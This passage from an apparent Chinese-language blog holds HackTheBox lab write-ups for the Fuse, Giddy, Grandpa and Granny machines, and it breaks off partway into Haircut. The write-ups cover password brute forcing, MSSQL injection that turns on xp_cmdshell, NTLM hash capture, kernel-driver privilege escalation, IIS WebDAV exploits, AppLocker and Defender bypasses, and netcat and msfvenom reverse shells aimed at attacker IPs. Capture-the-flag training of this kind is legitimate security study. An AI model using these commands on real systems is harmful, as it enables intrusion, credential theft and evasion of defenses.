Windows RPC</span><br><span class="line">49675&#x2F;tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49676&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49680&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49698&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49754&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;10&#x2F;15%Time&#x3D;5F888131%P&#x3D;x86_64-pc-linux-gnu%r(DNS</span><br><span class="line">SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version</span><br><span class="line">SF:\x04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: FUSE; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h34m51s, deviation: 4h02m31s, median: 14m49s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Fuse</span><br><span class="line">|   NetBIOS computer name: FUSE\x00</span><br><span class="line">|   Domain name: fabricorp.local</span><br><span class="line">|   Forest name: fabricorp.local</span><br><span class="line">|   FQDN: Fuse.fabricorp.local</span><br><span class="line">|_  System time: 2020-10-15T10:21:57-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-10-15T17:21:55</span><br><span class="line">|_  start_date: 2020-10-15T16:14:26</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了常规的http、SMB服务，发现了winrm服务(5895端口)</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Fuse/1.png" alt="1"></p>
<p>发现跳转，添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.193    fuse.fabricorp.local</span><br></pre></td></tr></table></figure>

<p>SMB不允许匿名访问</p>
<p>然后就有点迷了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这里入口好隐蔽…</p>
<p>手动检查80端口，发现了一些CSV文件，里面存有用户名</p>
<p><img src="/images/Fuse/2.png" alt="2"></p>
<p>接着使用cewl针对当前页面生成特殊字典，当作密码</p>
<p>使用msf的smb爆破功能</p>
<p><img src="/images/Fuse/3.png" alt="3"></p>
<p>这样就能获得第一个凭据了<code>tlavel/Fabricorp01</code></p>
<p>尝试枚举smb</p>
<p><img src="/images/Fuse/4.png" alt="4"></p>
<p>提示NT_STATUS_PASSWORD_MUST_CHANGE</p>
<p>这里需要通过使用<code>smbpasswd</code>来远程修改密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbpasswd -r 10.10.10.193 -U tlavel</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/5.png" alt="5"></p>
<p>修改成功后再次枚举，这样就成功了</p>
<p><img src="/images/Fuse/6.png" alt="6"></p>
<p>没有什么有意思的文件，尝试使用rpcclient进行枚举(samba的另一个套件)<br>命令参考<a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#rpcclient -U FABRICORP\\tlavel 10.10.10.193</span><br><span class="line">Enter FABRICORP\tlavel&#39;s password: </span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br><span class="line">rpcclient $&gt; enumprivs</span><br><span class="line">found 35 privileges</span><br><span class="line"></span><br><span class="line">SeCreateTokenPrivilege          0:2 (0x0:0x2)</span><br><span class="line">SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)</span><br><span class="line">SeLockMemoryPrivilege           0:4 (0x0:0x4)</span><br><span class="line">SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)</span><br><span class="line">SeMachineAccountPrivilege               0:6 (0x0:0x6)</span><br><span class="line">SeTcbPrivilege          0:7 (0x0:0x7)</span><br><span class="line">SeSecurityPrivilege             0:8 (0x0:0x8)</span><br><span class="line">SeTakeOwnershipPrivilege                0:9 (0x0:0x9)</span><br><span class="line">SeLoadDriverPrivilege           0:10 (0x0:0xa)</span><br><span class="line">SeSystemProfilePrivilege                0:11 (0x0:0xb)</span><br><span class="line">SeSystemtimePrivilege           0:12 (0x0:0xc)</span><br><span class="line">SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)</span><br><span class="line">SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)</span><br><span class="line">SeCreatePagefilePrivilege               0:15 (0x0:0xf)</span><br><span class="line">SeCreatePermanentPrivilege              0:16 (0x0:0x10)</span><br><span class="line">SeBackupPrivilege               0:17 (0x0:0x11)</span><br><span class="line">SeRestorePrivilege              0:18 (0x0:0x12)</span><br><span class="line">SeShutdownPrivilege             0:19 (0x0:0x13)</span><br><span class="line">SeDebugPrivilege                0:20 (0x0:0x14)</span><br><span class="line">SeAuditPrivilege                0:21 (0x0:0x15)</span><br><span class="line">SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)</span><br><span class="line">SeChangeNotifyPrivilege                 0:23 (0x0:0x17)</span><br><span class="line">SeRemoteShutdownPrivilege               0:24 (0x0:0x18)</span><br><span class="line">SeUndockPrivilege               0:25 (0x0:0x19)</span><br><span class="line">SeSyncAgentPrivilege            0:26 (0x0:0x1a)</span><br><span class="line">SeEnableDelegationPrivilege             0:27 (0x0:0x1b)</span><br><span class="line">SeManageVolumePrivilege                 0:28 (0x0:0x1c)</span><br><span class="line">SeImpersonatePrivilege          0:29 (0x0:0x1d)</span><br><span class="line">SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)</span><br><span class="line">SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)</span><br><span class="line">SeRelabelPrivilege              0:32 (0x0:0x20)</span><br><span class="line">SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)</span><br><span class="line">SeTimeZonePrivilege             0:34 (0x0:0x22)</span><br><span class="line">SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)</span><br><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">        flags:[0x800000]</span><br><span class="line">        name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]</span><br><span class="line">        comment:[]</span><br><span class="line"></span><br><span class="line">rpcclient $&gt;</span><br></pre></td></tr></table></figure>

<p>因为之前页面发现了疑似惠普打印机，重点关注一下打印机，疑似发现了密码<code>$fab@s3Rv1ce$1</code>，并且也枚举出了一堆用户名<br>使用这一堆用户名和密码，使用msf，针对winrm进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set PASSWORD &#39;$fab@s3Rv1ce$1&#39;                                                                </span><br><span class="line">PASSWORD &#x3D;&gt; $fab@s3Rv1ce$1                                                                    </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set USER_FILE &#x2F;root&#x2F;Desktop&#x2F;users.txt                                                                                  </span><br><span class="line">USER_FILE &#x3D;&gt; users                                                                                            </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set RHOSTS 10.10.10.193                                                                                       </span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.193                                                                                                                         </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 10.10.10.193:5985 - Login Successful: WORKSTATION\svc-print:$fab@s3Rv1ce$1</span><br></pre></td></tr></table></figure>

<p>这样，我们就可以利用这个凭据去进行连接，这里使用<code>evil-winrm</code>，使用方法:<a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install evil-winrm</span><br><span class="line">evil-winrm -u svc-print -p &#39;$fab@s3Rv1ce$1&#39; -i 10.10.10.193</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/7.png" alt="7"></p>
<p>这样就得到了初始shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Fuse/8.png" alt="8"></p>
<p>发现了SeLoadDriverPrivilege权限，可以滥用这个服务进行提权</p>
<p>英文:<a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a><br>中文翻译:<a href="https://www.anquanke.com/post/id/148227?from=singlemessage">https://www.anquanke.com/post/id/148227?from=singlemessage</a></p>
<p>接下来开始提权，首先需要准备一些文件</p>
<p>一个非分段式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.16.6 LPORT&#x3D;443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>编译eoploaddriver.cpp</p>
<p><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></p>
<p>下载Capcom.sys</p>
<p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></p>
<p>修改并编译ExploitCapcom.cpp</p>
<p><a href="https://github.com/tandasat/ExploitCapcom">https://github.com/tandasat/ExploitCapcom</a></p>
<p>修改第292行，改成反弹shell的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TCHAR CommandLine[] &#x3D; TEXT(&quot;C:\\temp\\shell.exe&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/10.png" alt="10"></p>
<p>一共四个文件，传输过去，放在同一目录下</p>
<p><img src="/images/Fuse/9.png" alt="9"></p>
<p>本地监听端口，执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</span><br><span class="line">.\ExploitCapcom.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/11.png" alt="11"></p>
<p>这样就可以得到权限提升</p>
<p><img src="/images/Fuse/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Giddy</title>
    <url>/2020/10/26/HTB-Giddy/</url>
    <content><![CDATA[<h1 id="Giddy"><a href="#Giddy" class="headerlink" title="Giddy"></a>Giddy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Giddy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查80和443端口，发现它们显示同样的页面，进行目录枚举</p>
<p><img src="/images/Giddy/4.png" alt="4"></p>
<p><code>/Remote/</code>是<code>Windows PowerShell Web Access</code>，需要登录凭据</p>
<p><img src="/images/Giddy/2.png" alt="2"></p>
<p><code>/mvc/</code>是<code>My ASP.NET Application</code>，内容看起来像博客</p>
<p><img src="/images/Giddy/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索处发现sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/6.png" alt="6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;-- -</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/7.png" alt="7"></p>
<p>应该是mssql注入，尝试一些payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; (select convert(int,@@version)) &#39;		报错注入失败</span><br><span class="line">a&#39;;WAITFOR DELAY &#39;0:0:5&#39;--				堆叠注入成功</span><br><span class="line"></span><br><span class="line">a&#39;;slect &#39;&#39; if (select user) &#x3D; &#39;dbo&#39; WAITFOR DELAY &#39;0:0:5&#39;--</span><br></pre></td></tr></table></figure>

<p>sqlmap也ok了</p>
<p><img src="/images/Giddy/8.png" alt="8"></p>
<p>页面的CSRFtoken没有阻止注入，但是sqlmap竟然没有识别出对方的指纹，不过影响不大，后面不用它了</p>
<p>尝试执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;;EXEC sp_configure &quot;show advanced options&quot;,1--</span><br><span class="line">a&#39;;RECONFIGURE--</span><br><span class="line">a&#39;;EXEC sp_configure &quot;xp_cmdshell&quot;,1--</span><br><span class="line">a&#39;;RECONFIGURE--</span><br><span class="line">a&#39;;EXEC xp_cmdshell &#39;ping -n 3 10.10.16.98&#39;--</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -n -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p>不过没有捕获到流量，看来RCE没有生效</p>
<p>检查权限发现，下面语句执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; if (select user) !&#x3D; &#39;dbo&#39; waitfor delay &#39;0:0:5&#39;--</span><br><span class="line">&#39; if (select user) !&#x3D; &#39;sa&#39; waitfor delay &#39;0:0:5&#39;--</span><br></pre></td></tr></table></figure>

<p>看起来不是sa权限，尝试<code>dir_tree</code>来进行smb连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py -smb2support a &#x2F;root&#x2F;Desktop&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; EXEC master.sys.xp_dirtree &#39;\\10.10.16.98\a&#39;--</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/9.png" alt="9"></p>
<p>之后可以是<code>responder</code>进行攻击，它会回答发出的LLMNR和NBT-NS查询，诱使受害者主机提供Net-NTLM哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>

<p>之后重发一下注入请求，得到对方的NTLMv2哈希，用户名为Stacy，主机名GIDDY</p>
<p><img src="/images/Giddy/10.png" alt="10"></p>
<p>把Sta开始的内容全部复制，NTLMv2会使用用户名和主机名来进行加盐加密</p>
<p><img src="/images/Giddy/11.png" alt="11"></p>
<p>john可以破解出它们xNnWo6272k7x</p>
<p>之后去登录powershell web access，如果直接登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stacy</span><br><span class="line">xNnWo6272k7x</span><br><span class="line">GIDDY</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/12.png" alt="12"></p>
<p>会出错，要避免域登录，所以需要指定本地登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIDDY\Stacy</span><br><span class="line">xNnWo6272k7x</span><br><span class="line">GIDDY</span><br></pre></td></tr></table></figure>

<p>获得shell</p>
<p><img src="/images/Giddy/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>机器拥有app-locker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-AppLockerPolicy -Local</span><br></pre></td></tr></table></figure>

<p>所以无法与WMIC进行交互来枚举服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/16.png" alt="16"></p>
<p>发现unifi video</p>
<p><img src="/images/Giddy/14.png" alt="14"></p>
<p>找到提权漏洞</p>
<p><img src="/images/Giddy/15.png" alt="15"></p>
<p>阅读它了解到了提权流程</p>
<p>由于错误的配置，我们拥有<code>C:\ProgramData\unifi-video</code>目录的写权限，<code>Ubiquiti UniFi Video</code>服务启动时会加载<code>C:\\ProgramData\\unifi-video\\taskkill.exe</code>，而这个<code>taskkill.exe</code>是不存在的，我们可以伪造一个<code>taskill.exe</code>的reverse_shell来获得system权限</p>
<p>尝试反向shell的时候发现，windows defender</p>
<p><img src="/images/Giddy/17.png" alt="17"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Operation did not complete successfully because the file contains a virus or potentially unwanted software</span><br></pre></td></tr></table></figure>

<p>可以编译一个.net的reverse_shell来绕过defender</p>
<p>首先查看目标机器的.net版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir C:\windows\microsoft.net\framework</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/18.png" alt="18"></p>
<p>项目地址:<a href="https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc">https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc</a></p>
<p>创建C#项目</p>
<p><img src="/images/Giddy/19.png" alt="19"></p>
<p>修改IP并编译</p>
<p><img src="/images/Giddy/20.png" alt="20"></p>
<p>传输到目标机器上，并命名为taskkill.exe</p>
<p>现在需要枚举服务名，这一部有些困难，正常的枚举会受到权限的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x2F;c sc query state&#x3D;all</span><br><span class="line">Get-WmiObject win32_service</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/21.png" alt="21"></p>
<p>学到到注册表枚举服务，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Location &#39;HKLM:\SYSTEM\CurrentControlSet\Services\&#39;</span><br><span class="line">Get-ChildItem</span><br><span class="line">Get-ChildItem . | Where-Object &#123; $_.Name -like &#39;*UniFiVideoService*&#39; &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/22.png" alt="22"></p>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/23.png" alt="23"></p>
<p>之后就可以启动/关闭服务即可，一次不行就多尝试几次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop-service &quot;Ubiquiti UniFi Video&quot;</span><br><span class="line">start-service &quot;Ubiquiti UniFi Video&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/24.png" alt="24"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>两个有意思的trick</p>
<h3 id="bypass-applocker"><a href="#bypass-applocker" class="headerlink" title="bypass applocker"></a>bypass applocker</h3><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></p>
<p>正常目录无法运行程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrato</span><br></pre></td></tr></table></figure>

<p>但是到上面名单的目录，默认是所有用户可写，就可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/26.png" alt="26"></p>
<h3 id="bypass-powershell-Constrained-Language-Mode"><a href="#bypass-powershell-Constrained-Language-Mode" class="headerlink" title="bypass powershell Constrained Language Mode"></a>bypass powershell Constrained Language Mode</h3><p>如果直接加载powershell代码，比如powerup，会出现问题</p>
<p><img src="/images/Giddy/27.png" alt="27"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cannot create type. Only core types are supported in this language mode.</span><br></pre></td></tr></table></figure>

<p>可以验证CLM是否启用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<p>这种情况，http请求都发不出去，先要绕过powershell CLM，链接:<a href="https://github.com/padovah4ck/PSByPassCLM">https://github.com/padovah4ck/PSByPassCLM</a></p>
<p>把<code>PsBypassCLM.exe</code>保存在目标的目录上，也是无法直接运行的</p>
<p><img src="/images/Giddy/28.png" alt="28"></p>
<p>使用下面语法，修改ip、端口、路径，可以得到一个reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;true &#x2F;revshell&#x3D;true &#x2F;rhost&#x3D;10.10.16.98 &#x2F;rport&#x3D;443 &#x2F;U C:\Users\Stacy\Documents\PsBypassCLM.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/29.png" alt="29"></p>
<p>在这个shell下，可以绕过CLM</p>
<p><img src="/images/Giddy/30.png" alt="30"></p>
<p>语句被成功加载</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Grandpa</title>
    <url>/2020/06/16/HTB-Grandpa/</url>
    <content><![CDATA[<h1 id="Grandpa"><a href="#Grandpa" class="headerlink" title="Grandpa"></a>Grandpa</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Grandpa/1.jpg" alt="1"></p>
<p>目标服务器IIS6.0，开启服务webdav</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>davtest</p>
<p><img src="/images/Grandpa/2.jpg" alt="2"></p>
<p>无法上传任何格式的文件</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="不使用metasploit"><a href="#不使用metasploit" class="headerlink" title="不使用metasploit"></a>不使用metasploit</h3><p>寻找公开漏洞</p>
<p><img src="/images/Grandpa/3.jpg" alt="3"></p>
<p>ScStoragePathFromUrl的缓冲区溢出是个不错的选择</p>
<p>不过这个py要修改的太多，还需要替换shellcode</p>
<p>在github上找了另一个方便利用的脚本CVE-2017-7269</p>
<p><a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python iis6-reverse-shell.py 10.10.10.14 80 10.10.16.173 4444</span><br></pre></td></tr></table></figure>

<p><img src="/images/Grandpa/4.jpg" alt="4"></p>
<p>成功获取shell</p>
<h3 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h3><p>windows/iis/iis_webdav_scstoragepathfromurl</p>
<p><img src="/images/Grandpa/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用CVE-2009-0079进行提权</p>
<p><a href="https://github.com/Re4son/Churrasco">https://github.com/Re4son/Churrasco</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">churrasco.exe -d &quot;nc.exe -nv 10.10.16.173 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Grandpa/7.jpg" alt="7"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Granny</title>
    <url>/2020/06/11/HTB-Granny/</url>
    <content><![CDATA[<h1 id="Granny"><a href="#Granny" class="headerlink" title="Granny"></a>Granny</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Granny/1.jpg" alt="1"></p>
<p>只开放了80端口，并且存在webdav服务，并且webdav开放了许多HTTP方法，这是非常危险的</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口没有其他的web服务，目录扫描也没有有价值的信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="webdav"><a href="#webdav" class="headerlink" title="webdav"></a>webdav</h3><p>使用davtest看看什么文件能上传/执行</p>
<p><img src="/images/Granny/2.jpg" alt="2"></p>
<p>发现aspx上传失败了，不过该服务还支持move方法，那只要上传符合的格式改名，应该就可以执行</p>
<p>先做个木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp lhost&#x3D;10.10.16.123 lport&#x3D;4444 -f aspx -o evil.txt</span><br></pre></td></tr></table></figure>

<p>再用cadaver上传上去</p>
<p><img src="/images/Granny/3.jpg" alt="3"></p>
<p>然后就可以getshell了</p>
<p><img src="/images/Granny/4.jpg" alt="4"></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>这次powershell没法用，所以就没用sherlock，使用Windows-Exploit-Suggester</p>
<p><img src="/images/Granny/5.jpg" alt="5"></p>
<p>发现了很多提权漏洞，逐个尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ms09-020.exe &quot;nc.exe -nv 10.10.16.123 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Granny/6.jpg" alt="6"></p>
<p>最后通过ms09-020，成功提权</p>
<p><img src="/images/Granny/7.jpg" alt="7"></p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>首先使用iis_webdav_upload_asp获取低权限shell</p>
<p><img src="/images/Granny/8.jpg" alt="8"></p>
<p>使用提权脚本查看漏洞</p>
<p><img src="/images/Granny/9.jpg" alt="9"></p>
<p>尝试使用ms15_051_client_copy_image，不过失败了</p>
<p>使用migrate，迁移到一个更稳定的进程</p>
<p><img src="/images/Granny/10.jpg" alt="10"></p>
<p>经过尝试，成功提权</p>
<p><img src="/images/Granny/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Haircut</title>
    <url>/2020/10/20/HTB-Haircut/</url>
    <content><![CDATA[<h1 id="Haircut"><a href="#Haircut" class="headerlink" title="Haircut"></a>Haircut</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Haircut/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Haircut/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>uploads目录无法访问</p>
<p><img src="/images/Haircut/8.png" alt="8"></p>
<p>检查exposed.php</p>
<p><img src="/images/Haircut/2.png" alt="2"></p>
<p>看样子是一个输入url的地方，考虑命令注入、SSRF、RFI之类的漏洞</p>
<p>尝试输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>发现得到了请求</p>
<p><img src="/images/Haircut/3.png" alt="3"></p>
<p>查看网页代码</p>
<p><img src="/images/Haircut/6.png" alt="6"></p>
<p>发现页面的内容被读取，但没被解释，不过看上面的<code>% Total    % Received % Xferd  Average Speed</code> 之类的提示，感觉这里是一个CURL命令</p>
<p>常规的命令注入无法实现</p>
<p><img src="/images/Haircut/7.png" alt="7"></p>
